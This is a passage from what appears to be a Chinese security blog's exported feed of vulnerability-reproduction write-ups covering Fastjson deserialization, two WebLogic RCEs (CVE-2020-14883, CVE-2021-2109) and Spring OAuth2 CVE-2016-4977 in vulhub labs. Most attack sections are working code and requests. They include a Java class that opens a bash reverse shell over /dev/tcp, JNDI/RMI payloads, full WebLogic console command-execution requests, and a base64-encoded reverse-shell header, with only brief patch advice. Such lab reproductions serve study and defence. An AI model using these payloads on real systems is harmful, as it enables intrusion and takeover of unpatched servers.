TouchFile.java<br>import java.lang.Runtime;<br>import java.lang.Process;<br><br>public class TouchFile &#123;<br>    static &#123;<br>        try &#123;<br>            Runtime rt = Runtime.getRuntime();<br>            String[] commands = &#123;&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;bash -i &gt;&amp; /dev/tcp/192.168.137.1/7890 0&gt;&amp;1&quot;&#125;;<br>            Process pc = rt.exec(commands);<br>            pc.waitFor();<br>        &#125; catch (Exception e) &#123;<br>            // do nothing<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="访问链接"><a href="#访问链接" class="headerlink" title="访问链接"></a>访问链接</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">// javac TouchFile.java<br>import java.lang.Runtime;<br>import java.lang.Process;<br><br>public class TouchFile &#123;<br>    static &#123;<br>        try &#123;<br>            Runtime rt = Runtime.getRuntime();<br>            String[] commands = &#123;&quot;curl&quot;,&quot;o34nai.dnslog.cn&quot;&#125;;<br>            Process pc = rt.exec(commands);<br>            pc.waitFor();<br>        &#125; catch (Exception e) &#123;<br>            // do nothing<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在 cmd 中使用如下命令将 java 源文件编译成 class 字节码文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">javac TouchFile.java<br></code></pre></td></tr></table></figure><p><img src="2.jpg"></p><p>然后在当前目录使用 python 开启 http 服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">python3 -m http.server 1234<br></code></pre></td></tr></table></figure><p><img src="3.jpg"></p><p>下载 <a href="https://github.com/mbechler/marshalsec">marshalsec</a></p><p>在 marshalsec-master 目录下的 cmd 中运行如下命令进行编译（仅第一次需要）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">mvn clean package -DskipTests<br></code></pre></td></tr></table></figure><p><img src="mvn.jpg"></p><p>编译好后会在目录下生成一个 target 目录</p><p>然后进入 target 目录中启动一个RMI服务器，并制定加载远程类 <code>TouchFile.class</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://192.168.137.1:1234/#TouchFile&quot; 9999<br></code></pre></td></tr></table></figure><p><img src="RMI.jpg"></p><p>然后 bp 中发包如下（这里有点慢，可能需要等十几秒）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">POST / HTTP/1.1<br>Host: 192.168.137.135:8090<br>Accept-Encoding: gzip, deflate<br>Accept: */*<br>Accept-Language: en<br>User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)<br>Connection: close<br>Content-Type: application/json<br>Content-Length: 162<br><br>&#123;<br>    &quot;b&quot;:&#123;<br>        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,<br>        &quot;dataSourceName&quot;:&quot;rmi://192.168.137.1:9999/TouchFile&quot;,<br>        &quot;autoCommit&quot;:true<br>    &#125;<br><br><br></code></pre></td></tr></table></figure><p><img src="poc.jpg"></p><p>此时 dnslog 界面已有记录</p><p><img src="dnslog.jpg"></p><h3 id="指纹特征"><a href="#指纹特征" class="headerlink" title="指纹特征"></a>指纹特征</h3><p>详细参考：<a href="https://www.freebuf.com/articles/web/242712.html">https://www.freebuf.com/articles/web/242712.html</a></p><p>构造以下payload，利用dnslog平台接收</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&#123;&quot;zeo&quot;:&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;xxx.dnslog.cn&quot;&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="dnslog_poc.jpg"></p><p>1.2.67 版本之后</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;xxx.dnslog.cn&quot;&#125;<br>&#123;&quot;@type&quot;:&quot;java.net.Inet6Address&quot;,&quot;val&quot;:&quot;xxx.dnslog.cn&quot;&#125;<br>#  畸形<br>&#123;&quot;@type&quot;:&quot;java.net.InetSocketAddress&quot;&#123;&quot;address&quot;:,&quot;val&quot;:&quot;xxx.dnslog.cn&quot;&#125;&#125;<br></code></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p><a href="https://github.com/mrknow001/fastjson_rec_exploit">exp</a> 参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">python3 fastjson_check.py<br><br>python3 fastjson_rce_exploit.py -u http://192.168.137.135:8090 -s 192.168.137.1 -c &quot;curl baidu.com&quot;<br></code></pre></td></tr></table></figure><h2 id="0x05-漏洞修复"><a href="#0x05-漏洞修复" class="headerlink" title="0x05  漏洞修复"></a>0x05  漏洞修复</h2><p>更新版本</p><h2 id="0x06-参考-URL"><a href="#0x06-参考-URL" class="headerlink" title="0x06 参考 URL"></a>0x06 参考 URL</h2><p><a href="https://vulhub.org/#/environments/fastjson/1.2.24-rce/">https://vulhub.org/#/environments/fastjson/1.2.24-rce/</a></p><p><a href="https://www.freebuf.com/articles/web/242712.html">https://www.freebuf.com/articles/web/242712.html</a></p><p><a href="https://blog.csdn.net/SuPejkj/article/details/109190901">https://blog.csdn.net/SuPejkj/article/details/109190901</a></p><p><a href="https://www.cnblogs.com/cute-puli/p/13466362.html">https://www.cnblogs.com/cute-puli/p/13466362.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
            <tag> Fastjson 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2020-14883 管理控制台未授权远程命令执行漏洞</title>
      <link href="/2021/08/06/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Weblogic%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE-2020-14883%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE-2020-14883/"/>
      <url>/2021/08/06/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Weblogic%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE-2020-14883%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE-2020-14883/</url>
      
        <content type="html"><![CDATA[<h4 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00  简介"></a>0x00  简介</h4><p>WebLogic是美国Oracle公司出品的一个application server，确切的说是一个基于JAVAEE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。</p><h4 id="0x01-漏洞概述"><a href="#0x01-漏洞概述" class="headerlink" title="0x01  漏洞概述"></a>0x01  漏洞概述</h4><p>远程攻击者可以构造特殊的<code>HTTP</code>请求，在未经身份验证的情况下接管 <code>WebLogic Server Console</code>，并在 <code>WebLogic Server Console</code> 执行任意代码</p><h4 id="0x02-影响版本"><a href="#0x02-影响版本" class="headerlink" title="0x02  影响版本"></a>0x02  影响版本</h4><p>Weblogic Server 10.3.6.0.0<br>Weblogic Server 12.1.3.0.0<br>Weblogic Server 12.2.1.3.0<br>Weblogic Server 12.2.1.4.0<br>Weblogic Server 14.1.1.0.0</p><h4 id="0x03-环境搭建"><a href="#0x03-环境搭建" class="headerlink" title="0x03  环境搭建"></a>0x03  环境搭建</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#  进入 vulhub 目录下的 /weblogic/CVE-2020-14883/ 目录<br>#  启动环境<br>sudo docker-compose up -d<br>#  查看账号及密码<br>sudo docker-compose logs | grep password<br>#  查看环境<br>sudo docker ps -a<br>#  进入环境目录<br>sudo docker exec -it 268f542b6482 bash<br></code></pre></td></tr></table></figure><h4 id="0x04-漏洞利用"><a href="#0x04-漏洞利用" class="headerlink" title="0x04  漏洞利用"></a>0x04  漏洞利用</h4><p><a href="https://github.com/zhzyker/exphub/blob/master/weblogic/cve-2020-14882_rce.py">exp</a></p><h5 id="主页页面"><a href="#主页页面" class="headerlink" title="主页页面"></a>主页页面</h5><p>主页页面如下</p><p><img src="1.jpg"></p><h5 id="进入未授权访问"><a href="#进入未授权访问" class="headerlink" title="进入未授权访问"></a>进入未授权访问</h5><p>进入未授权访问（CVE-2020-14882）页面</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">/console/css/%252e%252e%252fconsole.portal<br></code></pre></td></tr></table></figure><p>第一次进入时会显示这个，这里在访问一次就好了</p><p><img src="2.jpg"></p><p>访问后界面如下</p><p><img src="3.jpg"></p><h5 id="执行命令"><a href="#执行命令" class="headerlink" title="执行命令"></a>执行命令</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">POST /console/css/%252e%252e%252fconsole.portal HTTP/1.0<br>Host: 192.168.199.164:7001<br>User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36<br>Accept-Encoding: gzip, deflate<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Connection: close<br>Accept-Language: zh-CN,zh;q=0.9<br>Content-Type: application/x-www-form-urlencoded<br>cmd: whoami<br>Content-Length: 1221<br><br>_nfpb=true&amp;_pageLabel=&amp;handle=com.tangosol.coherence.mvel2.sh.ShellSession(&quot;weblogic.work.ExecuteThread executeThread = (weblogic.work.ExecuteThread) Thread.currentThread(); weblogic.work.WorkAdapter adapter = executeThread.getCurrentWork(); java.lang.reflect.Field field = adapter.getClass().getDeclaredField(&quot;connectionHandler&quot;); field.setAccessible(true); Object obj = field.get(adapter); weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl) obj.getClass().getMethod(&quot;getServletRequest&quot;).invoke(obj); String cmd = req.getHeader(&quot;cmd&quot;); String[] cmds = System.getProperty(&quot;os.name&quot;).toLowerCase().contains(&quot;window&quot;) ? new String[]&#123;&quot;cmd.exe&quot;, &quot;/c&quot;, cmd&#125; : new String[]&#123;&quot;/bin/sh&quot;, &quot;-c&quot;, cmd&#125;; if (cmd != null) &#123; String result = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter(&quot;\\A&quot;).next(); weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl) req.getClass().getMethod(&quot;getResponse&quot;).invoke(req);res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush(); res.getWriter().write(&quot;&quot;); &#125;executeThread.interrupt(); &quot;);<br></code></pre></td></tr></table></figure><p>执行命令后效果如下</p><p><img src="command.jpg"></p><h5 id="反弹-shell"><a href="#反弹-shell" class="headerlink" title="反弹 shell"></a>反弹 shell</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">POST /console/css/%252e%252e%252fconsole.portal HTTP/1.0<br>Host: 192.168.199.164:7001<br>User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36<br>Accept-Encoding: gzip, deflate<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Connection: close<br>Accept-Language: zh-CN,zh;q=0.9<br>Content-Type: application/x-www-form-urlencoded<br>cmd: /bin/bash -i &gt;&amp; /dev/tcp/192.168.199.139/9999 0&gt;&amp;1<br>Content-Length: 1221<br><br>_nfpb=true&amp;_pageLabel=&amp;handle=com.tangosol.coherence.mvel2.sh.ShellSession(&quot;weblogic.work.ExecuteThread executeThread = (weblogic.work.ExecuteThread) Thread.currentThread(); weblogic.work.WorkAdapter adapter = executeThread.getCurrentWork(); java.lang.reflect.Field field = adapter.getClass().getDeclaredField(&quot;connectionHandler&quot;); field.setAccessible(true); Object obj = field.get(adapter); weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl) obj.getClass().getMethod(&quot;getServletRequest&quot;).invoke(obj); String cmd = req.getHeader(&quot;cmd&quot;); String[] cmds = System.getProperty(&quot;os.name&quot;).toLowerCase().contains(&quot;window&quot;) ? new String[]&#123;&quot;cmd.exe&quot;, &quot;/c&quot;, cmd&#125; : new String[]&#123;&quot;/bin/sh&quot;, &quot;-c&quot;, cmd&#125;; if (cmd != null) &#123; String result = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter(&quot;\\A&quot;).next(); weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl) req.getClass().getMethod(&quot;getResponse&quot;).invoke(req);res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush(); res.getWriter().write(&quot;&quot;); &#125;executeThread.interrupt(); &quot;);<br></code></pre></td></tr></table></figure><p>发包后不会显示东西</p><p><img src="getshell-1.jpg"></p><p>这里等几秒后会获取到shell</p><p><img src="getshell-2.jpg"></p><h4 id="0x05-修复建议"><a href="#0x05-修复建议" class="headerlink" title="0x05  修复建议"></a>0x05  修复建议</h4><p>1、建议用户及时将 Weblogic 后台&#x2F;console&#x2F;console.portal 对外的访问权限暂时关闭。</p><p>2、此次 Oracle 官方的 CPU已发布了针对该漏洞的补丁，请受影响用户及时下载补丁程序并安装更新。</p><h4 id="0x06-参考-URL"><a href="#0x06-参考-URL" class="headerlink" title="0x06 参考 URL"></a>0x06 参考 URL</h4><p><a href="https://view.inews.qq.com/a/20201103A04ESS00">https://view.inews.qq.com/a/20201103A04ESS00</a></p><p><a href="https://www.dtmao.cc/news_show_349914.shtml">https://www.dtmao.cc/news_show_349914.shtml</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
            <tag> WebLogic 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2021-2109 远程命令执行漏洞复现</title>
      <link href="/2021/08/06/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Weblogic%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE-2021-2109%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE-2021-2109/"/>
      <url>/2021/08/06/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Weblogic%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE-2021-2109%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE-2021-2109/</url>
      
        <content type="html"><![CDATA[<h4 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00  简介"></a>0x00  简介</h4><p>WebLogic是美国Oracle公司出品的一个application server，确切的说是一个基于JAVAEE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。</p><h4 id="0x01-漏洞概述"><a href="#0x01-漏洞概述" class="headerlink" title="0x01  漏洞概述"></a>0x01  漏洞概述</h4><p>攻击者可构造恶意请求，造成 JNDI 注入，执行任意代码，从而控制服务器。</p><h4 id="0x02-影响版本"><a href="#0x02-影响版本" class="headerlink" title="0x02  影响版本"></a>0x02  影响版本</h4><p>Weblogic Server 10.3.6.0.0</p><p>Weblogic Server 12.1.3.0.0</p><p>Weblogic Server 12.2.1.3.0</p><p>Weblogic Server 12.2.1.4.0</p><p>Weblogic Server 14.1.1.0.0</p><h4 id="0x03-环境搭建"><a href="#0x03-环境搭建" class="headerlink" title="0x03  环境搭建"></a>0x03  环境搭建</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#  进入 vulhub 目录下的 /weblogic/CVE-2020-14882/ 目录<br>#  启动环境<br>sudo docker-compose up -d<br>#  查看账号及密码<br>sudo docker-compose logs | grep password<br>#  查看环境<br>sudo docker ps -a<br>#  进入环境目录<br>sudo docker exec -it 268f542b6482 bash<br></code></pre></td></tr></table></figure><h4 id="0x04-漏洞利用"><a href="#0x04-漏洞利用" class="headerlink" title="0x04  漏洞利用"></a>0x04  漏洞利用</h4><p>启动 <a href="https://github.com/feihong-cs/JNDIExploit/releases/tag/v1.2">LDAP</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#  默认为 LDAP 端口为 1389 HTTP 端口为 8080，如 HTTP 端口被占用，则使用 -p 指定新端口<br>java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 192.168.199.139 -p 9999<br></code></pre></td></tr></table></figure><p><img src="LDAP.jpg"></p><h5 id="未授权访问"><a href="#未授权访问" class="headerlink" title="未授权访问"></a>未授权访问</h5><p>配合未授权访问漏洞使用，poc如下</p><h6 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">GET /console/css/%252e%252e/consolejndi.portal?_pageLabel=JNDIBindingPageGeneral&amp;_nfpb=true&amp;JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22ldap://192.168.199;139:1389/Basic/WeblogicEcho;AdminServer%22) HTTP/1.1<br>Host: 192.168.137.135:7001<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<br>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br>Accept-Encoding: gzip, deflate<br>cmd: whoami<br>Connection: close<br>Upgrade-Insecure-Requests: 1<br>X-Forwarded-For: 127.0.0.1<br><br><br></code></pre></td></tr></table></figure><p>执行命令后效果如下</p><p><img src="command.jpg"></p><h6 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h6><p>反弹 shell 时需要对命令进行<a href="http://www.jackson-t.ca/runtime-exec-payloads.html">编码</a></p><p><img src="encoding.jpg"></p><p>发包如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">GET /console/css/%252e%252e/consolejndi.portal?_pageLabel=JNDIBindingPageGeneral&amp;_nfpb=true&amp;JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22ldap://192.168.199;139:1389/Basic/WeblogicEcho;AdminServer%22) HTTP/1.1<br>Host: 192.168.137.135:7001<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<br>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br>Accept-Encoding: gzip, deflate<br>cmd: bash -c &#123;echo,L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMTk5LjEzOS8xMjM0IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;<br>Connection: close<br>Upgrade-Insecure-Requests: 1<br>X-Forwarded-For: 127.0.0.1<br><br><br></code></pre></td></tr></table></figure><p>发包后不会显示东西</p><p><img src="getshell-1.jpg"></p><p>这里等几秒后会获取到shell</p><p><img src="getshell-2.jpg"></p><h5 id="登陆"><a href="#登陆" class="headerlink" title="登陆"></a>登陆</h5><p>登陆后使用如下poc（注意替换cookie）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">GET /console/consolejndi.portal?_pageLabel=JNDIBindingPageGeneral&amp;_nfpb=true&amp;JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22ldap://192.168.199;139:1389/Basic/WeblogicEcho;AdminServer%22) HTTP/1.1<br>Host: 192.168.137.135:7001<br>Pragma: no-cache<br>Cache-Control: no-cache<br>Upgrade-Insecure-Requests: 1<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Safari/537.36<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Referer: http://192.168.137.135:7001/console/login/LoginForm.jsp<br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q=0.9<br>Cookie: ADMINCONSOLESESSION=lkkapQnDa4Qaj2IRB6asL1pLr3t8n5jF0SKVxJds395jm141tcxv!2113187095; _ga=GA1.1.911180934.1625562603<br>cmd: whoami<br>x-forwarded-for: 127.0.0.1<br>Connection: close<br><br><br></code></pre></td></tr></table></figure><h4 id="0x05-修复建议"><a href="#0x05-修复建议" class="headerlink" title="0x05  修复建议"></a>0x05  修复建议</h4><p>1、禁用T3协议</p><p>如果您不依赖T3协议进行JVM通信，可通过暂时阻断T3协议缓解此漏洞带来的影响</p><ul><li><p>1). 进入Weblogic控制台，在base_domain配置页面中，进入“安全”选项卡页面，点击“筛选器”，配置筛选器。</p></li><li><p>2). 在连接筛选器中输入：weblogic.security.net.ConnectionFilterImpl，在连接筛选器规则框中输入：* * 7001 deny t3 t3s。</p></li></ul><p>2、禁止启用IIOP</p><p>登陆Weblogic控制台，找到启用IIOP选项，取消勾选，重启生效</p><p>3、临时关闭后台&#x2F;console&#x2F;console.portal对外访问</p><p>4、升级官方安全补丁</p><h4 id="0x06-参考-URL"><a href="#0x06-参考-URL" class="headerlink" title="0x06 参考 URL"></a>0x06 参考 URL</h4><p><a href="http://wiki.peiqi.tech/PeiQi_Wiki/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Weblogic/Weblogic%20LDAP%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2021-2109.html">http://wiki.peiqi.tech/PeiQi_Wiki/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Weblogic/Weblogic%20LDAP%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2021-2109.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
            <tag> WebLogic 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2016-4977 Spring Security OAuth2 远程命令执行漏洞复现</title>
      <link href="/2021/08/06/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Spring%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE-2016-4977/CVE-2016-4977/"/>
      <url>/2021/08/06/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Spring%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE-2016-4977/CVE-2016-4977/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00  简介"></a>0x00  简介</h2><p>Spring Security OAuth 是为 Spring 框架提供安全认证支持的一个模块。</p><h2 id="0x01-漏洞概述"><a href="#0x01-漏洞概述" class="headerlink" title="0x01  漏洞概述"></a>0x01  漏洞概述</h2><p>用户使用 <code>Whitelabel views</code> 来处理错误时，攻击者在被授权的情况下可以通过构造恶意参数来远程执行命令。</p><h2 id="0x02-影响版本"><a href="#0x02-影响版本" class="headerlink" title="0x02  影响版本"></a>0x02  影响版本</h2><p>2.0.0 to 2.0.9</p><p>1.0.0 to 1.0.5</p><h2 id="0x03-环境搭建"><a href="#0x03-环境搭建" class="headerlink" title="0x03  环境搭建"></a>0x03  环境搭建</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#  进入 vulhub 目录下的 /spring/CVE-2016-4977 目录<br>#  启动环境<br>sudo docker-compose up -d<br>#  查看环境<br>sudo docker ps -a<br>#  进入环境目录<br>sudo docker exec -it 268f542b6482 bash<br></code></pre></td></tr></table></figure><h2 id="0x04-漏洞利用"><a href="#0x04-漏洞利用" class="headerlink" title="0x04  漏洞利用"></a>0x04  漏洞利用</h2><p>页面如下</p><p><img src="1.jpg"></p><p>访问 <code>/oauth/authorize</code>  后会看到如下页面</p><p>账号密码：admin&#x2F;admin</p><p><img src="2.jpg"></p><h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">/oauth/authorize?response_type=token&amp;client_id=acme&amp;redirect_uri=$&#123;2*3&#125;<br></code></pre></td></tr></table></figure><p>结果如下</p><p><img src="3.jpg"></p><p>对命令进行<a href="http://www.jackson-t.ca/runtime-exec-payloads.html">编码</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">bash -i &gt;&amp; /dev/tcp/192.168.137.1/1234 0&gt;&amp;1<br></code></pre></td></tr></table></figure><p><img src="encoding.jpg"></p><p>然后将编码后的结果放到 docker 环境中自带的poc中</p><p><img src="poc.jpg"></p><p>poc 内容如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 